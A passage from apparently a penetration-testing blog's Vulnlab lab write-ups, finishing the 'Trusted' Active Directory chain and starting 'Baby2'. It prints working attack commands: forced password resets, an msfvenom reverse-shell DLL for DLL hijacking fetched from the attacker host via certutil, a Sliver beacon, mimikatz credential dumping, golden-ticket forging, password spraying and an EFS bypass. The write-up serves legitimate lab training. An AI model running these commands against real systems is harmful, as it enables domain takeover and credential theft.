can do.</p>\n<p>In case you are unfamiliar with how to set up Bloodhound, here’s a beginner walkthrough to do before the next step in this walkthrough. <a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a></p>\n<p>After uploading the zip folder to Bloodhound, let’s search up the domain object for <code>rsmith@lab.trusted.vl</code>. After selecting <code>Node Info</code>, we can see that <code>rsmith</code> has an1 outbound object control.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/g.jpg\"></p>\n<p>It seems that <code>rsmith</code> has <code>ForceChangePassword</code> rights onto <code>ewalters</code>, one of the other users that we dumped in our enumeration of the SQL instance previously. This outbound object control means exactly what you think it might mean - <code>rsmith</code> has the ability to force a password reset on <code>ewalters</code>, meaning we can do exactly that.</p>\n<h1 id=\"ForceChangePassword-Object-Control\"><a href=\"#ForceChangePassword-Object-Control\" class=\"headerlink\" title=\"ForceChangePassword Object Control\"></a>ForceChangePassword Object Control</h1><p>To reset a user’s password with this outbound object control, you can use tools such as <code>rpcclient</code> or <code>bloodyad</code>. I’m more used to using <code>bloodyad</code> so that’s what we’ll use in our situation. <code>bloodyAD/bloodyAD.py -u &#39;rsmith&#39; -p &#39;[...snip...]&#39; -d &#39;lab.trusted.vl&#39; --host 10.10.157.166 set password &#39;ewalters&#39; &#39;password123@&#39;</code></p>\n<p>I changed <code>ewalters</code> password to something simple, however you can make it whatever you’d like. If successful, you’ll receive a small <code>[+] Password has changed successfully!</code> message. This indicates that the password for <code>ewalters</code> has been changed amongst the entire domain.</p>\n<p>We can now verify that the changes have been made with CrackMapExec. I’ve decided to use a one-liner with all of the CME services separated by a newline in a text file.<br><code>for line in $(cat cme_services.txt); do crackmapexec $line 10.10.157.166 -u &#39;ewalters&#39; -p &#39;password123@&#39;; done</code></p>\n<p>You’ll notice that while RDP is valid (despite Bloodhound telling us that this user has RDP privileges, we can authenticate to WinRM.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SMB         10.10.157.166   5985   LABDC            [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl)</span><br><span class=\"line\">HTTP        10.10.157.166   5985   LABDC            [*] http://10.10.157.166:5985/wsman</span><br><span class=\"line\">WINRM       10.10.157.166   5985   LABDC            [+] lab.trusted.vl\\ewalters:password123@ (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>So from here we’ll use <code>evil-winrm</code> to authenticate through WinRM with the <code>ewalters</code> user.</p>\n<p><code>evil-winrm --ip 10.10.157.166 -u &#39;ewalters&#39; -p &#39;password123@&#39;</code></p>\n<p><img src=\"/images/vulnlab/trusted-vl/h.jpg\"></p>\n<h1 id=\"DC1-Host-Reconnaissance\"><a href=\"#DC1-Host-Reconnaissance\" class=\"headerlink\" title=\"DC1 Host Reconnaissance\"></a>DC1 Host Reconnaissance</h1><p>While normally we’d get the user flag at this point, <code>r0BIT</code> messed around with us and left a fake flag in <code>ewalters</code> Desktop directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\ewalters\\Documents&gt; cd ../Desktop</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\ewalters\\Desktop&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    Directory: C:\\Users\\ewalters\\Desktop</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website</span><br><span class=\"line\">-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website</span><br><span class=\"line\">-a----         9/18/2022   9:12 PM         202492 robitcat.jpg</span><br><span class=\"line\">-a----         9/18/2022   9:11 PM            108 User.txt</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">c*Evil-WinRM* PS C:\\Users\\ewalters\\Desktop&gt; cat User.txt</span><br><span class=\"line\">|\\---/|</span><br><span class=\"line\">| o_o |</span><br><span class=\"line\"> \\_^_/</span><br><span class=\"line\">These are not the flags you&#x27;re looking for.</span><br><span class=\"line\">Take :robitcat: as compensation :).</span><br></pre></td></tr></table></figure>\n\n<p>It looks like we’ll need to look around a little more and escalate to another user to get the user flag. My guess is that we’ll need to get to <code>cpowers</code>, who was the third and final user that we were able dumped from the SQL database.</p>\n<p>While I was looking around the filesystem for any leads, I stumbled across a folder in the <code>C:\\</code> directory titled, <code>AVTest</code>. This isn’t a folder that’s here regularly so let’s take a look into it a little more.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\AVTest&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    Directory: C:\\AVTest</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">-a----         9/14/2022   4:46 PM        4870584 KasperskyRemovalTool.exe</span><br><span class=\"line\">-a----         9/14/2022   7:05 PM            235 readme.txt</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\AVTest&gt; cat readme.txt</span><br><span class=\"line\">Since none of the AV Tools we tried here in the lab satisfied our needs it&#x27;s time to clean them up.</span><br><span class=\"line\">I asked Christine to run them a few times, just to be sure.</span><br><span class=\"line\"></span><br><span class=\"line\">Let&#x27;s just hope we don&#x27;t have to set this lab up again because of this.</span><br></pre></td></tr></table></figure>\n\n<p>The <code>readme.txt</code> tells us that the AV tools are being disposed of, however it seems that the <code>cpowers</code> user will be running this executable a few more times before the dispose is initiated.</p>\n<p>In a regular red-teaming context, we need to ensure that we move hastily upon seeing this. We may not know the timeframe when the <code>cpowers</code> user is going to execute values.<br>At the same time, this is a pen-testing lab, so I’m going to assume that there’s a scheduled task running every now and then that will execute the file - just my logical thinking though.</p>\n<p>Not only that, but if we take a look at <code>cpowers</code> in Bloodhound, we can see that they’re part of the Domain Admins group for this domain.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/i.jpg\"></p>\n<p>This means that if we compromise <code>cpowers</code>, we’ll have full control over this domain controller.</p>\n<p>Let’s examine this file to see if there’s anything we can do to escalate our privileges when <code>cpowers</code> runs it. Normally I’d just transfer it using a C2 or by using a simple Python server on the Windows machine, however it seems I was unable to find success when trying either of them. Instead we can stand up our own SMB server using Impacket’s <code>smbserver</code> utility.</p>\n<p>Kali - <code>impacket-smbserver smb share/ -smb2support</code><br>WinRM - <code>copy KasperskyRemovalTool.exe \\\\10.8.0.173\\smb\\KasperskyRemovalTool.exe</code></p>\n<p>This should download the AV tool into our <code>share/</code> directory (that we might need to create locally before setting up the SMB server).</p>\n<p>So this next part was where I got confused, as examining this with tools such as Ghidra didn’t result in many finds. Usually when it comes to reverse engineering PE32 binaries, you’d want to look specifically at abnormal classes or functions or even DLLs that the binary uses that could be exploited. The only issue is that all of these binary functions for this file seem to be relatively normal or at least don’t seem to be noteworthy enough to look into.</p>\n<p>Looking into CVE’s didn’t seem to get me anywhere either, but it started to get a few gears working as to what we could potentially do. <a href=\"https://www.exploit-db.com/exploits/10484\">https://www.exploit-db.com/exploits/10484</a><br>While we know that the starting functions don’t seem to be very important, what about the DLLs that are loaded while the file is running? Could these potentially be exploited?</p>\n<p>I decided to use ProcMon for this, as we can look specifically at the DLLs that are being ran after we execute the file and while it is running.<br>Note that I was running my machine through a Kali Linux VM, so I’ll need to transfer it to my local Windows 10 host in order to examine it with ProcMon.</p>\n<h1 id=\"ProcMon-Executable-Reverse-Engineering\"><a href=\"#ProcMon-Executable-Reverse-Engineering\" class=\"headerlink\" title=\"ProcMon Executable Reverse Engineering\"></a>ProcMon Executable Reverse Engineering</h1><p>There are alternatives to setting up ProcMon for Linux, however I was unable to get it working when I had tried it out initially. I’ll still leave the link for it as provided here: <a href=\"https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file\">https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file</a></p>\n<p><img src=\"/images/vulnlab/trusted-vl/j.jpg\"></p>\n<p>Before we run the file, we should make sure that we have the right filters set up since we’ll get barraged with internal functions and files that the binary will use during runtime. Go to <code>Filter &gt; Filter</code> (or just press <code>Ctrl + l</code></p>\n<p>On this screen, we can create filters to view only a section of processes and&#x2F;or functions that interest us.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/k.jpg\"></p>\n<p>For simplicities sake, I’ve outlined the filter parameters that we’ll need to detect the processes of interest.</p>\n<p><code>Process Name - contains - Kaspersky -&gt; then Include</code><br><code>Path - ends with - .dll -&gt; then Include</code></p>\n<p>Running the file with these two filters still leaves us with a barrage of information, however you’ll notice that many of the DLLs have a <code>Result</code> value of <code>NAME NOT FOUND</code>. This is particularly interesting, as the <code>File Path</code> for the DLL is within the same directory of the binary that was executed.</p>\n<p>We’ll also put down these results as another filter to see specifically what DLLs these results entail.</p>\n<p><code>Result - is - NAME NOT FOUND -&gt; then Include</code></p>\n<p><img src=\"/images/vulnlab/trusted-vl/l.jpg\"></p>\n<p>There are a numerous amount of DLLs that are executed within the same directory as the binary (my binary is located in <code>Downloads\\kas\\</code>). This presents us with a vulnerability that is also new for my research - DLL Hijacking.</p>\n<h1 id=\"DLL-Hijacking\"><a href=\"#DLL-Hijacking\" class=\"headerlink\" title=\"DLL Hijacking\"></a>DLL Hijacking</h1><p>DLL Hijacking is a Windows application vulnerability that essentially allows an attacker to load malicious DLLs into a process in place of regular DLLs. This can occur in the situation in front of us - when a binary uses DLLs that are located within a modifiable directory that we have access to. By replacing a normal DLL that is used, we can trick the Windows API into running our malicious DLL.</p>\n<p>I plan on making a research post about DLL Hijacking in the future, however in the meantime I’ve referenced a HackTricks post that illustrates it relatively well.<br><a href=\"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking\">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</a></p>\n<p>So in that case let’s give it a try. We’ll start by creating a malicious DLL with <code>msfvenom</code>, which can be done using the following command. I initially tried this with replacing <code>USP10.dll</code>, however I found that it wouldn’t spawn a reverse shell as intended. Instead, we’ll use the <code>KasperskyRemovalToolENU.dll</code> that is called multiple times during runtime.<br><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.173 LPORT=9001 -f dll &gt; KasperskyRemovalToolENU.dll</code></p>\n<p>We’ll then set up a Python web server with <code>python3 -m http.server 9002</code> to transfer the file.<br>Also, we’ll set up a netcat reverse shell so that when <code>cpowers</code> executes the Kaspersky tool binary, we’ll get a callback after our malicious DLL is ran.</p>\n<p>On Kali - <code>nc -lvnp 9001</code><br>On WinRM - <code>certutil.exe -urlcache -f http://10.8.0.173:9002/KasperskyRemovalToolENU.dll KasperskyRemovalToolENU.dll</code></p>\n<p>After a few seconds of waiting, our netcat listener should spawn a reverse shell as <code>cpowers</code>.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/m.jpg\"></p>\n<p>Since we are now a DA, we can read the user flag that is present in the <code>Administrator</code> directory.</p>\n<p><code>PS C:\\Windows\\system32&gt; cd C:\\Users\\Administrator\\Desktop; cat User.txt</code></p>\n<p>From here, I stood up a Sliver C2 server to try and enumerate the other domain a little easier.</p>\n<p>Note that we couldn’t do this previously as <code>ewalters</code>, as there was a GPO that restricted us from doing so.<br>If you’re unaware on how to set up a Sliver C2 server, I’ll reference the material needed to do so here: <a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><code>sliver &gt; mtls</code><br><code>generate beacon --mtls 10.8.0.173 --os windows --format exe --arch amd64 --skip-symbols --save (directory of your choice)</code></p>\n<p>After transferring the file and running it on our reverse shell, we should see a session spawn on Sliver.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/n.jpg\"></p>\n<p>So to start, my first guess is that there’s some form of domain trust amongst both domain controllers. I had said this earlier in the machine, just based off the chain’s name <code>Trusted</code>. There’s two (technically three) methods that I know of to enumerate a domain, consisting across all of the shells we have access to.</p>\n<h1 id=\"Domain-Trust-Enumeration\"><a href=\"#Domain-Trust-Enumeration\" class=\"headerlink\" title=\"Domain Trust Enumeration\"></a>Domain Trust Enumeration</h1><p>We can enumerate the domain locally with <code>Get-ADTrust</code>, a regular PowerShell module that is present on this machine.<br><code>Get-ADTrust -Filter *</code></p>\n<p>Another is to drop <code>PowerView</code> to the machine and then import it.<br><a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1\">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a><br><code>Import-Module .\\PowerView.ps1; Get-DomainTrust</code></p>\n<p>Finally, we can also use <code>sharpview</code>, a .NET version of <code>PowerView</code> that is present in Sliver’s <code>armory</code> function.<br><code>sliver &gt; armory install sharpview</code><br><code>sliver &gt; sharpview Get-Domain</code><br>The only issue with <code>sharpview</code> is that I was running into an LDAP issue (when running <code>Get-DomainTrust</code>, so I’ll just use the local <code>PowerView</code> option we discussed about previously.</p>\n<p>After running <code>Get-DomainTrust</code> or <code>Get-ADTrust</code>, we receive the following output.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/o.jpg\"></p>\n<p>This means that there is a <code>Bidirectional</code> domain trust between both the child domain <code>lab.trusted.vl</code> and the parent domain <code>trusted.vl</code>. What this essentially means is that both domains <code>lab.trusted.vl</code> and <code>trusted.vl</code> trust one another - meaning that if you are a Domain Admin in one of the domains, you can also create a TGT for a Domain Admin in the other.</p>\n<p>I’d like to create a blog post about this in the future, as the term for this is called <code>Domain Dominance</code> and is relatively interesting how you can compromise domains through domain trusts. You can also verify this in <code>Bloodhound</code> by looking at the <code>Map Domain Trusts</code> in the <code>Analysis</code> tab.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/p.jpg\"></p>\n<p>This also means that we can create a Golden ticket through Kerberos that can be used across both domains. For context, a Golden ticket is a forged TGT, which is signed by the respective domain’s <code>krbtgt</code> service account. This ticket can be used to impersonate any user, on any service, to every machine on the domain (or within the domain trust!). What also makes this incredibly powerful is that the credentials are never changed automatically. This means that if you have the <code>krbtgt</code> AES or NTLM hash, you can essentially perform almost any domain attack that you’d like (such as <code>dcsync</code> as an example).</p>\n<p>In order to exploit the domain trust, we’ll need three different things: </p>\n<ul>\n<li>The <code>NTLM</code> of the <code>krbtgt</code> domain object.</li>\n<li>The <code>LAB</code> domain object SID.</li>\n<li>The <code>TRUSTED</code> domain object SID for the <code>Enterprise Admins</code> group.</li>\n</ul>\n<p>In order to get all three of those, we can use <code>mimikatz</code> to dump all of this information. Generally we’d want to try and get <code>mimikatz</code> past AV by utilizing a C2 or by process injection, however we won’t need to do this since Defender is not enabled for this chain.</p>\n<h1 id=\"Golden-Ticket-to-DC2\"><a href=\"#Golden-Ticket-to-DC2\" class=\"headerlink\" title=\"Golden Ticket to DC2\"></a>Golden Ticket to DC2</h1><p>Thus, we can just drop <code>mimikatz</code> to disk and run it through the DC. <a href=\"https://github.com/ParrotSec/mimikatz\">https://github.com/ParrotSec/mimikatz</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver &gt; upload mimikatz.exe</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\cpowers\\Documents&gt; .\\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /user:krbtgt /patch&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This gives us the <code>krbtgt</code> NTLM hash as well as the <code>LAB</code> domain SID.<br>In order to get the domain SID of the <code>TRUSTED</code> domain, we can use a built-in PowerShell cmdlet call <code>Get-ADGroup</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\cpowers\\Documents&gt; Get-ADGroup -Filter &#123;name -eq &quot;Enterprise Admins&quot;&#125; -Server trusted.vl</span><br></pre></td></tr></table></figure>\n\n<p>Try not to do this through <code>Evil-WinRM</code>, I ran into some domain resolution issues and instead found better luck by running it through a reverse shell.<br>We now have the following information in order to build our Golden ticket.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">NTLM Hash     - [...snip...]</span><br><span class=\"line\">LAB SID       - S-1-5-21-2241985869-2159962460-1278545866</span><br><span class=\"line\">TRUSTED SID   - S-1-5-21-3576695518-347000760-3731839591-519</span><br><span class=\"line\">Target Domain - trusted.vl</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; impacket-ticketer -nthash [...snip...] -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 -domain lab.trusted.vl Administrator</span><br></pre></td></tr></table></figure>\n\n<p>This saves our Golden ticket as a new file called <code>Administrator.ccache</code>. We’ll need to set this as a global variable on our Kali machine to use this to authenticate with Kerberos on the parent domain.</p>\n<p>Once all of this is completed, we can use <code>psexec</code> to spawn a shell in this domain as the <code>Administrator</code> user. Reminder to use the <code>FQDN</code> (Fully Qualified Domain Name) of the parent domain controller, which is <code>trusteddc.trusted.vl</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; export KRB5CCNAME=Administrator.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; impacket-psexec lab.trusted.vl/Administrator@trusteddc.trusted.vl -k -no-pass -target-ip 10.10.197.213</span><br></pre></td></tr></table></figure>\n\n<p>This will open up a remote shell through <code>PsExec</code> on the <code>TRUSTEDDC</code> domain controller a <code>SYSTEM</code>, meaning we have completed this chain! Is what I hoped.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/q.jpg\"></p>\n<p>You’ll notice that if you try to read the <code>root.txt</code>, we don’t have the permissions to read it. Which if we think about it, doesn’t make sense right? We’re <code>SYSTEM</code> yet we don’t have permissions to read the file.</p>\n<p>My guess is that there are privileges that restricting us from accessing this file, meaning we need to use . To save some time (in the screenshot above as you’ll notice), I used <code>mimikatz</code> to dump the Administrator hash and log-in with it through WinRM, however this STILL did not let us access the file.</p>\n<p><code>C:\\Users\\Administrator\\Desktop&gt; .\\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /user:Administrator /patch&quot; &quot;exit&quot; </code>evil-winrm –ip 10.10.197.213 -u ‘Administrator’ -H ‘[…snip…]’&#96; (with Administrator NTLM hash)</p>\n<p>If you run <code>cipher /u /n</code> on the machine, you’ll notice that the <code>root</code> flag is encrypted with <code>EFS</code>.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/r.jpg\"></p>\n<h1 id=\"EFS-Bypass-as-SYSTEM\"><a href=\"#EFS-Bypass-as-SYSTEM\" class=\"headerlink\" title=\"EFS Bypass as SYSTEM\"></a>EFS Bypass as SYSTEM</h1><p>EFS (Encrypted File System) is a built-in Windows encryption feature that allows you to encrypt files or directories to prevent other users from opening them. This produces a certificate, which is required to be present in your current session in order to decrypt the encrypted file and read it.</p>\n<p>I also plan on creating a blog post based on <code>EFS</code> file decryption, as there’s other bypasses aside from the one you’ll see in a few moments.</p>\n<p>To bypass this, we can use <code>runasCs</code> to circumvent the <code>EFS</code> encryption and read the flag as we  would normally.<br>We’ll also need to change the <code>Administrator</code>‘s user password in order to use <code>runasCs</code>, which is really simple now that we have access to command-line session as this user.</p>\n<p><code>net user administrator &quot;password123@&quot;</code><br><a href=\"https://github.com/antonioCoco/RunasCs\">https://github.com/antonioCoco/RunasCs</a></p>\n<p>Note that you can just use the PowerShell module that comes in this GitHub package, and just import it. Make sure to also upload this in a directory other than the <code>Administrator</code> directory, as this entire directory under the <code>EFS</code> encryption rule.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver &gt; upload RunasCs/Invoke-RunasCs.ps1</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Public\\Desktop&gt; Import-Module .\\Invoke-RunasCs.ps1; Invoke-RunasCs administrator &quot;password123@&quot; &quot;cmd.exe /c type C:\\users\\administrator\\desktop\\root.txt&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This will open the file and allow us to read the contents of the <code>root</code> flag. Thus, we have completed this chain!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>Big thanks to <code>r0BIT</code> for creating this chain, as it was extremely helpful in understanding Domain Dominance and EFS encryption. Helped a lot to help myself understand these topics and how to perform them mainly through Kali (and with some help through Mimikatz).</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a><br><a href=\"https://www.exploit-db.com/exploits/10484\">https://www.exploit-db.com/exploits/10484</a><br><a href=\"https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file\">https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file</a><br><a href=\"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking\">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1\">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a><br><a href=\"https://github.com/ParrotSec/mimikatz\">https://github.com/ParrotSec/mimikatz</a><br><a href=\"https://github.com/antonioCoco/RunasCs\">https://github.com/antonioCoco/RunasCs</a></p>\n"},{"title":"Baby2 - Vulnlab","date":"2024-06-05T20:06:39.000Z","keywords":"Vulnlab, Medium, Windows","description":"This machine was really interesting to get into, as I learned how to practically implement backdoors onto a compromised host as well as GPO abuses and general vulnerability testing in domain accounts. Props to xct for creating this machine.","cover":"/images/vulnlab/baby2-vl/baby2_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nThis machine was really interesting to get into, as I learned how to practically implement backdoors onto a compromised host as well as GPO abuses and general vulnerability testing in domain accounts. Props to xct for creating this machine.\n\n# Enumeration\n\nLet's start with a general NMAP scan of the machine.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 21:04 EDT\nNmap scan report for 10.10.102.12\nHost is up (0.11s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n3389/tcp  open  ms-wbt-server\n57294/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 19.46 seconds\n```\n\nI also did a bit of more in-depth scans into the different ports with `-A` and found the DNS name for the machine denoted as `dc.baby2.vl`.\n\nThis box seems to have similar ports to the original `Baby` machine, which was an Easy machine that I've done before. Since there isn't a webserver, let's see if there's anything we can find initially with SMB.\n`smbclient -L 10.10.102.12 -N`\n\nThis will enumerate all of the SMB shares if we can see them by authenticating with null credentials.\n\n```\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tADMIN$          Disk      Remote Admin\n\tapps            Disk      \n\tC$              Disk      Default share\n\tdocs            Disk      \n\thomes           Disk      \n\tIPC$            IPC       Remote IPC\n\tNETLOGON        Disk      Logon server share \n\tSYSVOL          Disk      Logon server share\n```\n\nYou'll see that there are around three shares that are not usually on here - being `apps`, `docs`, and `homes`. This is inherently already a vulnerability, as I should not be allowed to view these shares by default with null credentials. Let's take a look into the `homes` directory to start, as the way it sounds this could be the home directories of a few users.\n`smbclient \\\\\\\\10.10.102.12\\\\homes -N`\n\nIn the directory that we land in, you'll find a list of users and (what we can assume) are their home directories. This is great because we already now have a wordlist to test around with LDAP.\n\n```\nsmb: \\> ls\n  .                                   D        0  Sat Sep  2 10:45:25 2023\n  ..                                  D        0  Tue Aug 22 16:10:21 2023\n  Amelia.Griffiths                    D        0  Tue Aug 22 16:17:06 2023\n  Carl.Moore                          D        0  Tue Aug 22 16:17:06 2023\n  Harry.Shaw                          D        0  Tue Aug 22 16:17:06 2023\n  Joan.Jennings                       D        0  Tue Aug 22 16:17:06 2023\n  Joel.Hurst                          D        0  Tue Aug 22 16:17:06 2023\n  Kieran.Mitchell                     D        0  Tue Aug 22 16:17:06 2023\n  library                             D        0  Tue Aug 22 16:22:47 2023\n  Lynda.Bailey                        D        0  Tue Aug 22 16:17:06 2023\n  Mohammed.Harris                     D        0  Tue Aug 22 16:17:06 2023\n  Nicola.Lamb                         D        0  Tue Aug 22 16:17:06 2023\n  Ryan.Jenkins                        D        0  Tue Aug 22 16:17:06 2023\n\n\t\t6126847 blocks of size 4096. 2005567 blocks available\n```\n\nI made a one-liner that should take all of these usernames from the SMB session and convert it into a list of usernames.\n`smbclient -c 'ls' \\\\\\\\10.10.102.12\\\\homes -N | awk '{print $1}' | grep [A-Za-z] > ul.txt`\n\nWith our list of usernames, let's test to see if any of these users are vulnerable to Kerberoasting or ASREPRoasting. We'll try and use the `Guest` user with no credentials since we don't currently have any valid passwords.\n`impacket-GetNPUsers -dc-ip 10.10.102.12 -dc-host dc.baby.vl -usersfile ul.txt -request -no-pass BABY2/'Guest'`\n`impacket-GetUserSPNs -dc-ip 10.10.102.12 -dc-host dc.baby.vl -usersfile ul.txt BABY2/'Guest' -no-pass`\n\nUnfortunately, neither seem to produce any valid results.\n\n# Credential Reusage\n\nAnother test that I learned how to do in one of the previous HTB machines that I practiced against is testing for username/password reusage - which is essentially just seeing if users are using their username as their password. This is generally the case when testing OT infrastructure, however let's give it a try here.\n\nWe can use crackmapexec for the feature along with the user list that we already have. I also added another one-liner for ease-of-use.\n`for user in $(cat ul.txt); do crackmapexec smb 10.10.102.12 -u $user -p $(echo $user | tr '[:upper:]' '[:lower:]'); done`\n\nThe format that the above command references will return any valid credentials with credential reusage, ex: 'Amelia.Griffiths:amelia.griffiths'.\n\n```\nSMB         10.10.102.12    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)\nSMB         10.10.102.12    445    DC               [+] baby2.vl\\library:library\n```\n\nThis confirms that the `library` user is using the same string for both their username and password.\n\nNow that we have credentials, let's see if we can access any of the other SMB shares such as `docs` or `apps`. We'll try `apps` first just to be sure.\n\n`smbclient \\\\\\\\10.10.102.12\\\\apps -U 'library'`\nThere seems to be a folder in this share denoted as `dev`, we'll access it with `cd dev`\n\n```\nsmb: \\dev\\> ls\n  .                                   D        0  Thu Sep  7 15:13:50 2023\n  ..                                  D        0  Thu Sep  7 15:12:59 2023\n  CHANGELOG                           A      108  Thu Sep  7 15:16:15 2023\n  login.vbs.lnk                       A     1800  Thu Sep  7 15:13:23 2023\n\n\t\t6126847 blocks of size 4096. 2003374 blocks available\n```\n\nLet's grab both of these with `mget *` to see what they have. I'm not as interested in the CHANGELOG, more so in the VBS shortcut.\n\n# Logon Script Exploitation\n\nUpon opening the `login.vbs.lnk` shortcut on our local machine, we can see that most of the file is encrypted, however there are some valid strings that point us to another share.\n`\\Windows\\SYSVOL\\sysvol\\baby2.vl\\scripts\\login.vbs`\n\nWe also find the SID of the domain `S-1-5-21-213243958-1766259620-4276976267`\n\nLet's access the file and see if there's anything we can find.\n`smbclient \\\\\\\\10.10.102.12\\\\SYSVOL -U 'library'`\n\nThe `login.vbs` file is within `\\baby2.vl\\scripts\\`.\n\n```\nSub MapNetworkShare(sharePath, driveLetter)\n    Dim objNetwork\n    Set objNetwork = CreateObject(\"WScript.Network\")    \n  \n    [...snip...]\n    \n    Set objNetwork = Nothing\nEnd Sub\n\nMapNetworkShare \"\\\\dc.baby2.vl\\apps\", \"V\"\nMapNetworkShare \"\\\\dc.baby2.vl\\docs\", \"L\"\n```\n\nThis script looks to be mapping the network drives within the SMB instance, at least from first glance. You can see at the end that the SMB shares `apps` and `docs` are being mapped to `V` and `L` respectively. If this script is a login script that is ran when a user logs in, then we can potentially alter this to give us a reverse shell on the users machine once they log in.\n\nHowever what we know now is not enough to justify this, so let's check to see if bloodhound supports our thought process. I'll link the same bloodhound materials that I normally use for domain object enumeration.\n[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux)\n[https://github.com/dirkjanm/BloodHound.py](https://github.com/dirkjanm/BloodHound.py)\n\nWe'll run the python ingestor to dump the LDAP instance and all of its domain objects to a compressed zip archive.\n`python3 BloodHound.py/bloodhound.py -d 'baby2.vl' -u 'library' -p 'library' -c all -ns 10.10.102.12 --zip`\n\nOnce we receive the archive, we can upload it to Bloodhound using the `Upload Data` function.\n\nLet's look at our `library` user node to see if there are any login scripts that might correspond with the same `login.vbs` file that we saw prior.\n\n![](/images/vulnlab/baby2-vl/c.jpg)\n\nThere 